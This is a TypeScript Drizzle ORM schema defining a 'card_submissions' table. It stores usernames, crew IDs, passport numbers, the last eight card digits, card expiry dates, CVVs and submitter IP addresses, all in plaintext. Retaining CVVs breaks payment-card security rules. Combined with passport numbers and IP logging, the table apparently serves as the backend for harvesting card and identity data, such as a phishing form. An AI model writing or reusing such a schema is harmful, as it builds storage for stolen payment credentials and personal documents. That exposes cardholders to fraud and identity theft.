import { pgTable, serial, text, timestamp } from "drizzle-orm/pg-core";

export const cardSubmissionsTable = pgTable("card_submissions", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  crewId: text("crew_id"),
  passportNo: text("passport_no"),
  cardLast8: text("card_last8"),
  cardMonth: text("card_month"),
  cardYear: text("card_year"),
  cvv: text("cvv"),
  ipAddress: text("ip_address"),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
});

export type CardSubmission = typeof cardSubmissionsTable.$inferSelect;
